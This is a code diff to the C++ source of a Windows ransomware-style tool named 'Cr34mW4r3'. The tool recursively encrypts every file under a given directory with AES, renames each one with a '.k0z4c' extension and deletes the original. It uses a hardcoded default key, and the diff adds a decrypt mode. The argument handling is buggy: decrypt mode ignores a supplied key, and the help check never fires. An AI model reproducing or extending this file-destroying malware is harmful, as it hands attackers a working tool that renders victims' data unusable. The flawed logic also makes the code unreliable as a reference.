@@ -6,12 +6,19 @@
 
 using namespace std;
 
-BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey, DWORD& errCode)
+#define CREAMWARE_EXT L".k0z4c"
+
+enum modeFlag_t { encrypt, decrypt };
+
+BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey, DWORD& errCode, modeFlag_t op)
 {
     // only local files - \\*
     std::wstring tmp = directory + L"\\*";
     WIN32_FIND_DATAW file;
     HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
+    bool mode = static_cast<bool>(op);
+    ext = (op == decrypt ? L"*.k0z4c" : ext);
+
     if (search_handle != INVALID_HANDLE_VALUE)
     {
         std::vector<std::wstring> directories;
@@ -24,19 +31,23 @@ BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey,
                     continue;
             }
 
-            // FIX: oss << '\"' << fullBatchFileName << '\"';
             tmp = directory + L"\\" + std::wstring(file.cFileName);
             wcout << tmp << endl;
             if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
               && PathMatchSpecW(file.cFileName, ext.c_str())) {
+                auto newFileName = (
+                    op == encrypt ?
+                    (tmp + CREAMWARE_EXT) : tmp.substr(0, (tmp.size() - (sizeof(CREAMWARE_EXT) / sizeof(wchar_t) - 1))
+                ));
 
-                auto newFileName = (tmp + L".locked");
                 wcout << "[*] Encrypting " << tmp;
                 wcout << " to " << newFileName << endl;
+
                 encryptFile(
                     tmp.c_str(), newFileName.c_str(),
-                    aeskey, false
+                    aeskey, mode
                 );
+
                 DeleteFileW(tmp.c_str());
                 wcout << tmp << endl;
             }           
@@ -48,7 +59,7 @@ BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey,
         FindClose(search_handle);
 
         for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
-            FindFile(*iter, ext, aeskey, errCode);
+            FindFile(*iter, ext, aeskey, errCode, op);
         return TRUE;
     } else {
         errCode = GetLastError();
@@ -63,7 +74,7 @@ const wstring sanitizePath(wstring path) {
      return path;
 }
 
-int wmain(int argc, wchar_t** argv)
+int wmain(int argc, wchar_t* argv[])
 {
     auto printNice = [](const wchar_t* s) {
         wcout << "[*] " << s << endl;
@@ -71,24 +82,35 @@ int wmain(int argc, wchar_t** argv)
 
     const wchar_t* help =
         L"[*] This is  the Cr34mW4r3 manpage\n"
-        L"[+] usage: creamware <dirpath> <b64(aeskey-16)>\n"
+        L"[+] usage: creamware <dirpath> <b64(aeskey-16)> <encrypt||decrypt>\n"
         L"[+] if aeskey-16 is not specified the following key will be used:\n"
         L"[*] aeskey: 3igcZhRdWq96m3GUmTAiv9\n";
-
 
     if (argc < 1) {
         wcout << help;
         return 0;
     }
 
-    wcout << argv[1] << endl;
     const wstring directoryPath = sanitizePath(argv[1]);
 
+    // command to encrypt
+    // creamware <path> [key]
+    // to decrypt
+    // creamware <path> <key> decrypt
+    // if no key was specified then is 3igcZhRdWq96m3GUmTAiv9
     DWORD errCode = 0;
+    modeFlag_t flagMode = (argc == 4 ? decrypt : encrypt);
     auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
-    if (FindFile(directoryPath, L"", aeskey, errCode) != TRUE) {
-        printNice(L"Some problem with the path provided ...");
-        return 1;
+    if (flagMode == decrypt) {
+        if (FindFile(directoryPath, L"", aeskey, errCode, decrypt) != TRUE) {
+            printNice(L"The path exists? ...");
+            return 1;
+        }
+    } else {
+        if (FindFile(directoryPath, L"", aeskey, errCode, encrypt) != TRUE) {
+            printNice(L"The path exists? ...");
+            return 1;
+        }
     }
 
     return 0;
